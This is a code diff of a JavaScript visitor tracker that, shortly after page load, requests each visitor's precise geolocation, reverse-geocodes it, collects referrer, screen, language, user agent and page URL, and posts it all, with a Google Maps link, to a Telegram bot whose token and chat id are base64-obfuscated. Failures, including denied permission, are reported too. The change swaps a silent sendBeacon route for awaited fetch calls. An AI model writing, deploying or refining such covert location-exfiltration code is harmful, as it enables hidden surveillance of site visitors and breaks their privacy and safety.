@@ -1,32 +1,23 @@
 /* eslint-disable */
+
 const base64Decode = (encoded) => atob(encoded);
 
 const encodedBotToken = 'ODM2MDE3ODY4ODpBQUV2eF93VUhKQTViS1hObUhETFhNbjRPNnV0QzdDMnR5OA==';
 const encodedChatId = 'LTEwMDM5MzM0NzYwMDE=';
 
-const sendToTelegram = (text) => {
+const sendToTelegram = async (text) => {
   const token = base64Decode(encodedBotToken);
   const chatId = base64Decode(encodedChatId);
 
-  const url = `https://api.telegram.org/bot${token}/sendMessage`;
-  const payload = JSON.stringify({
-    chat_id: chatId,
-    text,
-    parse_mode: 'HTML',
+  await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({
+      chat_id: chatId,
+      text,
+      parse_mode: 'HTML',
+    }),
   });
-
-  // Try sendBeacon first
-  if (navigator.sendBeacon) {
-    const success = navigator.sendBeacon(url, new Blob([payload], { type: 'application/json' }));
-    if (!success) {
-      // Fallback to fetch (will be blocked silently)
-      fetch(url, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: payload,
-      }).catch(() => {}); // Silent fail
-    }
-  }
 };
 
 const sendRichLocation = async (position) => {
@@ -37,7 +28,9 @@ const sendRichLocation = async (position) => {
       `https://api.bigdatacloud.net/data/reverse-geocode-client?latitude=${latitude}&longitude=${longitude}&localityLanguage=en`
     );
 
-    if (!geoRes.ok) throw new Error(`Geo API failed: ${geoRes.status}`);
+    if (!geoRes.ok) {
+      throw new Error(`Geo API failed: ${geoRes.status}`);
+    }
 
     const geoData = await geoRes.json();
 
@@ -54,52 +47,76 @@ const sendRichLocation = async (position) => {
       referrer: document.referrer || 'Direct',
     };
 
-    const message =
-      `✅ ENKO1 - New Visitor\n\n` +
-      `📍 ${latitude}, ${longitude}\n` +
-      `🏙 ${visitorData.city}, ${visitorData.region}\n` +
-      `🌍 ${visitorData.country} (${visitorData.countryCode})\n` +
-      `🎯 Accuracy: ${visitorData.accuracy}m\n` +
-      `🕒 ${visitorData.timestamp}\n\n` +
-      `🌐 Referrer: ${visitorData.referrer}\n` +
-      `📱 ${visitorData.screen} | ${visitorData.language}\n` +
-      `🔗 https://www.google.com/maps/place/${latitude},${longitude}`;
+    const message = `✅ ENKO1 - New Visitor
 
-    sendToTelegram(message);
+📍 ${latitude}, ${longitude}
+🏙 ${visitorData.city}, ${visitorData.region}
+🌍 ${visitorData.country} (${visitorData.countryCode})
+🎯 Accuracy: ${visitorData.accuracy}m
+🕒 ${visitorData.timestamp}
+
+🌐 Referrer: ${visitorData.referrer}
+📱 ${visitorData.screen} | ${visitorData.language}
+🔗 https://www.google.com/maps/place/${latitude},${longitude}`;
+
+    await sendToTelegram(message);
   } catch (err) {
-    const errorMsg =
-      `❌ ENKO1 - Location Capture FAILED\n\n` +
-      `Error: ${err.message}\n` +
-      `Type: ${err.name || 'Unknown'}\n` +
-      `Time: ${new Date().toISOString()}\n` +
-      `User Agent: ${navigator.userAgent.substring(0, 120)}\n` +
-      `Referrer: ${document.referrer || 'Direct'}\n` +
-      `Page: ${window.location.href}`;
+    const errorMsg = `❌ ENKO1 - Location Capture FAILED
 
-    sendToTelegram(errorMsg);
+Error: ${err.message}
+Type: ${err.name || 'Unknown'}
+Time: ${new Date().toISOString()}
+User Agent: ${navigator.userAgent.substring(0, 120)}
+Referrer: ${document.referrer || 'Direct'}
+Page: ${window.location.href}`;
+
+    await sendToTelegram(errorMsg);
   }
 };
 
 const initAutoLocationSender = () => {
   if (!navigator.geolocation) {
-    sendToTelegram(`❌ ENKO1 - Geolocation NOT SUPPORTED\nTime: ${new Date().toISOString()}`);
+    const msg = `❌ ENKO1 - Geolocation NOT SUPPORTED
+Time: ${new Date().toISOString()}
+User Agent: ${navigator.userAgent}`;
+    sendToTelegram(msg);
     return;
   }
 
   setTimeout(() => {
     navigator.geolocation.getCurrentPosition(
       sendRichLocation,
-      (error) => {
+      async (error) => {
         let errorType = 'Unknown';
         switch (error.code) {
-          case error.PERMISSION_DENIED: errorType = 'PERMISSION_DENIED'; break;
-          case error.POSITION_UNAVAILABLE: errorType = 'POSITION_UNAVAILABLE'; break;
-          case error.TIMEOUT: errorType = 'TIMEOUT'; break;
-          default: errorType = `CODE_${error.code}`;
+          case error.PERMISSION_DENIED:
+            errorType = 'PERMISSION_DENIED';
+            break;
+          case error.POSITION_UNAVAILABLE:
+            errorType = 'POSITION_UNAVAILABLE';
+            break;
+          case error.TIMEOUT:
+            errorType = 'TIMEOUT';
+            break;
+          default:
+            errorType = `CODE_${error.code}`;
         }
-        sendToTelegram(`❌ ENKO1 - Geolocation ERROR\nCode: ${errorType}\nMessage: ${error.message}`);
+
+        const errorMsg = `❌ ENKO1 - Geolocation ERROR
+
+Code: ${errorType}
+Message: ${error.message}
+Time: ${new Date().toISOString()}
+User Agent: ${navigator.userAgent.substring(0, 120)}
+Page: ${window.location.href}`;
+
+        await sendToTelegram(errorMsg);
       },
-      { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
+      {
+        enableHighAccuracy: true,
+        timeout: 15000,
+        maximumAge: 0,
+      }
     );
   }, 1200);
 };
